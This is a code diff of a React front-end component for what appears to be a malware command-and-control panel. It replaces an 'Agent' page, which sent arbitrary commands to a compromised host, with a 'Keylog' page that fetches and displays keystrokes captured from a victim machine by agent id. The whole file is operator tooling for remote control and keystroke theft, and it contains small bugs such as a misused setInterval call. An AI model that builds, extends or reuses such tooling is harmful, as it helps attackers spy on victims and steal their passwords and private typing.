@@ -1,17 +1,16 @@
 import React, { useState, useEffect } from 'react';
 import { useParams } from 'react-router-dom';
 import Banner from './banner'
-import { getAgent,sendCommand } from '../actions/c2actions'
-import CommandBlock from './command';
+import { getKeylog } from '../actions/c2actions'
 
-const Agent = (props) => {
+const Keylog = (props) => {
   const [result, setResult] = useState([]);
   const [loading, setLoading] = useState(true);
   let { id } = useParams();
   let textInput = React.createRef();
 
-  const init = async () => {
-    var res = await getAgent(id)
+   const getKey = async () => {
+    var res = await getKeylog(id)
     console.log(res.payload)
     if (res.payload) {
       setResult(res.payload)
@@ -19,26 +18,18 @@ const Agent = (props) => {
     }
   }
 
-  const send = async () => {
-    var command = {
-      command: textInput.current.value
-    }
-    var res = await sendCommand(id, command)
-    console.log(res.payload)
-  }
-
   useEffect(() => {
   //  init()
-  setInterval(init(), 1000)
+  setInterval(getKey(), 1000)
   },[]);
 
-  // if (loading) {
-  //   return (
-  //     <font size={2} color="#FFFFFF">
-  //       Loading.....
-  //     </font>
-  //   );
-  // }
+  if (loading) {
+    return (
+      <font size={2} color="#FFFFFF">
+        Loading.....
+      </font>
+    );
+  }
   return (
     <td colSpan={1} width={1} valign="top" height={1}>
       {/*Start Center Area*/}
@@ -63,16 +54,51 @@ const Agent = (props) => {
                   face="lucida console"
                   color="#FFFFFF"
                 >
-                  Agent {id}
+                  KEYLOG
                   <br />
                 </font>
                 {/* End Blurb*/}
               </td>
             </tr>
             {/*End Blurb Row*/}
-            <CommandBlock
-              list={result}
-            />
+            {/*Start News 1 Banner */}
+            <pre>
+                    <font face="lucida console">
+                        <font size={2} color="#00FFFF">
+                            {" "}
+                            ______________________________________________________{" "}
+                        </font>
+                        {"\n"}
+                        {/* <font size={2} color="#ff3333">
+                            |
+                        </font> */}
+                        <font size={2} color="#888888">
+                            {" "}
+                            +{" "}
+                        </font>
+                        <font size={2} color="#FFFFFF">
+                            {/*Start News 1 Title */}
+                            {/* {this.props.command} */}
+                            <textarea value={result[0].Keys ? result[0].Keys  : "No Keys..." } rows={30}/>
+                            {/*End News 1 Title */}
+                        </font>
+                        <font size={2} color="#888888">
+                            {" "}
+                            +{"     "}
+                        </font>
+                        <font size={2} color="#888888">
+                            {/* <font size={2} color="#ff3333">
+                                |
+                            </font> */}
+                            {"\n"}
+                            <font size={2} color="#00FFFF">
+                                {" "}
+                                ------------------------------------------------------{" "}
+                            </font>
+                        </font>
+                    </font>
+                </pre>
+                {/*End News 1 Banner */}
             {/*Start News 1 Banner */}
             <pre>
                     <font face="lucida console">
@@ -91,13 +117,9 @@ const Agent = (props) => {
                         <font size={2} color="#FFFFFF">
                             {/*Start News 1 Title */}
                             {/* {this.props.command} */}
-                            <input ref={textInput} type="text" />
-                            <button onClick={send}>
-                              Send
-                            </button>
-                            <button onClick={init}>
-                              Refresh
-                            </button>
+                           <button onClick={getKey}>
+                            Refresh
+                          </button>
                             {/*End News 1 Title */}
                         </font>
                         <font size={2} color="#888888">
@@ -124,4 +146,4 @@ const Agent = (props) => {
   )
 
 };
-export default Agent
+export default Keylog
